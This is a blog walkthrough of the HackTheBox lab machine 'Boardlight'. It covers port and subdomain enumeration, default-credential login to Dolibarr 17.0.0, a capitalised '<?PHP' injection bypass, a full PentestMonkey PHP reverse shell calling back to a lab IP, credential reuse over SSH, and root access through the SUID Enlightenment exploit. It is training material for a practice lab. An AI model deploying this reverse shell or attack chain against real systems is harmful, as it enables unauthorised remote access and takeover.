---
layout: post
title: Boardlight
date: 2025-06-28 10:00:00 +0100
categories: [Walkthroughs]
tags: [hackthebox, linux, web-app,php injection, linux privesc]
---
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/boardlight/BoardlightAvatar.png?raw=true)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | HackTheBox       |
| OS | Linux        |
| Difficulty | Easy        |
| Release Date | 25 May 2024        |
| Link to machine | [Boardlight](https://app.hackthebox.com/machines/BoardLight)        |

# Highlights
PHP injection, Linux Enumeration, OSINT, SUID, Linux Privilege Escalation

---

# Open ports enumeration
Nmap scan

```bash
nmap -T4 -p- -A 10.10.11.11 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 12:50 BST
Nmap scan report for board.htb (10.10.11.11)
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   54.04 ms 10.10.16.1
2   27.83 ms board.htb (10.10.11.11)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.43 seconds
```

Nmap returns open ports for ```SSH``` (Port 22) and a web server ```HTTP```  (Port 80) ```(Apache HTTP version 2.4.41)```. 

# SSH Enumeration
We attempt to connect via ```SSH``` to confirm that password authentication is enabled. Once we have confirmation we move on to port 80 as we do not have valid credentials yet
# HTTP Enumeration
We nagivate to ```http://10.10.11.11``` to check what functionality does the website have, and we do not find much, apart from the domain name, so we add it to our ```/etc/hosts``` file
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/boardlight/Boardlight1.png?raw=true)



# Subdomain enumeration with FFUF

We start enumerating subdomains, to see if any are present, and we find one, ```crm```.
We can add ```crm.board.htb``` to the ```/etc/hosts``` file and navigate to it.
```bash
ffuf -u http://board.htb -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.board.htb" -fs 15949

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 312ms]
```


# crm.board.htb
The new webpage brings us to a login form, disclosing a CRM platform called ```Dolibarr```, running version ```17.0.0.```
A quick google search returns some default credentials ```admin:admin```, which allows us to access the website and be logged as ```admin```.
Most of the functionalities are disabled, but we are able to create a website and pages.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/boardlight/crm.boardlight.png?raw=true)

# Dolibarr 17.0.0 PHP injection
Continuing our round of OSINT, we discover that Dolibarr <= 17.0.0 is vulnerable to ```PHP injection```, as the application check for the ```<?php``` tag can be bypassed by using one or more capital letters in ```php```.
More details about the proof of concept can be found [here](https://www.swascan.com/security-advisory-dolibarr-17-0-0/).

We test the proof of concept mentioned in the Swanscan post
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/boardlight/Boardlight2.png?raw=true)

This is proof that is vulnerable to ```PHP injection```, and we have remote code execution.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/boardlight/Boardlight3.png?raw=true)

# Reverse shell and Foothold

We start a ```netcat``` listener on our attack machine
```bash
nc -nvlp 4444
```
We can use revshells.com to create a payload, I have chosen the PHP PentestMonkey version, and modified the payload to have ```PHP``` instead of ```php```, in order to bypass the the check on the ```“<?php”``` tag like explained in the poc.

```bash
<?PHP
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.2';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
And we receive a ```reverse shell```.

```bash
nc -nvlp 4444                                                      
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.11] 58084
Linux boardlight 5.15.0-107-generic #117~20.04.1-Ubuntu SMP Tue Apr 30 10:35:57 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 05:27:43 up 37 min,  0 users,  load average: 0.01, 0.01, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (859): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:/$ whoami
whoami
www-data
www-data@boardlight:/$ hostname
hostname
boardlight
www-data@boardlight:/$ 
```
Enumerating the users, we find only two users that have shell access, ```larissa``` and ```root```.
```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```
In the path ```/html/crm.board.htb/htdocs/conf``` there is a file called ```conf.php``` containing credentials for ```mysql```, running on port ```3306``` on ```localhost```.
Logging to```mysql``` on the ```localhost``` with the found credentials does not bring us any further, so we attempt the same password found in the conf file with one of the users we discovered earlier, ```larissa```.
```bash
ssh larissa@board.htb

larissa@boardlight:~$ whoami
larissa
larissa@boardlight:~$ hostname
boardlight
```
Once the ```user.txt``` is collected, we move on to finding a path to root.

# Privilege Escalation and Root flag
Enumerating SUID, we find ```enlightenment```, one of the main window manager for Linux, that can be exploited as explained [here](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit).
```bash
find / -type f -perm -04000 -ls 2>/dev/null
     2491     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
      608     16 -rwsr-sr-x   1 root     root        14488 Apr  8  2024 /usr/lib/xorg/Xorg.wrap
    17633     28 -rwsr-xr-x   1 root     root        26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
    17628     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
    17627     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
    17388     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/
```

Simply copying the ```exploit.sh``` found at [https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh), allows us to escalate to ```root```, and collect the ```root.txt``` flag.


Enjoy!

